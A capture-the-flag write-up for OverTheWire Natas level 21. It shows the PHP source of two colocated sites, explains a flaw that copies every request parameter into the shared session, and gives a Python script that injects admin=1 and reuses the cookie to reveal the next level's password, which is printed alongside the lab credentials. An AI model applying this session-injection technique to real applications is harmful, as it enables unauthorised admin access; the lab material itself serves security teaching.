# Level 21
## What does the main page look like?
```php
$ curl -s --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org/
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "IFekPyrQXftziDEsUr3x21sYuahypdgJ" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Main page Source code
```php
$ curl -s --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/
css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-
ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/
wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></
script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "<censored>" };</
script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-
experimenter.natas.labs.overthewire.org">http://natas21-
experimenter.natas.labs.overthewire.org</a></b>
</p>

<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION
["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Colocated site

```php
$ curl -s --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org
<html>
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/wargames/natas/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</a></b>
</p>

<p>Example:</p>
<div style='background-color: yellow; text-align: center; font-size: 100%;'>Hello world!</div>
<p>Change example values here:</p>
<form action="index.php" method="POST">align: <input name='align' value='center' /><br>fontsize: <input name='fontsize' value='100%' /><br>bgcolor: <input name='bgcolor' value='yellow' /><br><input type="submit" name="submit" value="Update" /></form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Colocated site source code

```php
$ curl -s --user natas21:IFekPyrQXftziDEsUr3x21sYuahypdgJ http://natas21-experimenter.natas.labs.overthewire.org/index-source.html | html2text 
<html>
<head><link rel="stylesheet" type="text/css" href="http://www.overthewire.org/
wargames/natas/level.css"></head>
<body>
<h1>natas21 - CSS style experimenter</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://
natas21.natas.labs.overthewire.org">http://natas21.natas.labs.overthewire.org</
a></b>
</p>
<?  

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array
("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION
["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>

<p>Example:</p>
<?=$example?>

<p>Change example values here:</p>
<?=$form?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

## Analysis
We have a main website and a colocated website. Colocated is highly the meaning of shared sessions. As the main website does not reveal obvious entry points for an attack to elevate our privileges, it becomes obvious that we need to elevate our privileges on the colocated website first, and take advantage of this to do the same in the main website.

Now, with this in mind, it appears that the following code is vulnerable to an injection:

```php
if(array_key_exists("submit", $_REQUEST)) {
	foreach($_REQUEST as $key => $val) {
		$_SESSION[$key] = $val;
	}
}
```

Indeed, the `foreach` loop will iterate through all variables defined in the `$_REQUEST` variable (including `GET` and `POST`) and will add them as session variables. We will exploit this vulnerability to create `$_SESSION['admin'] = 1`.

## Scripting

Our objective is to:
1. Inject a new variable to the form POST on the colocated website
2. create a session cookie in the colocated website (`$_SESSION['admin']` set to `1`)
3. Get the resulting `PHPSESSID` (will be an admin session)
4. Override the `PHPSESSID` of the main page (to elevate our privileges to admin)
5. Refresh the main page to reveal the password (as we should now be admin)

Let's write a python script that will take care of all these steps.

```python
#!/usr/bin/env python3
import requests

auth_user = 'natas21'
auth_pass = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'

# POST request on colocated website
r = requests.post(
	'http://natas21-experimenter.natas.labs.overthewire.org',
	auth=(auth_user, auth_pass),
	data={'admin':'1','submit':'Update'}
	)

phpsessid = r.cookies['PHPSESSID']
print("PHPSESSID = %s\n" % phpsessid)

# Now on the main website
r = requests.post(
	'http://natas21.natas.labs.overthewire.org',
	auth=(auth_user, auth_pass),
	cookies={'PHPSESSID':phpsessid}
	)

print(r.text)
```

Here is the output:

```php
$ python flag.py 
PHPSESSID = 564oev4dl0ngls29iksfpmkmt0

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas21", "pass": "IFekPyrQXftziDEsUr3x21sYuahypdgJ" };</script></head>
<body>
<h1>natas21</h1>
<div id="content">
<p>
<b>Note: this website is colocated with <a href="http://natas21-experimenter.natas.labs.overthewire.org">http://natas21-experimenter.natas.labs.overthewire.org</a></b>
</p>

You are an admin. The credentials for the next level are:<br><pre>Username: natas22
Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

# Flag
~~~
natas22:chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
~~~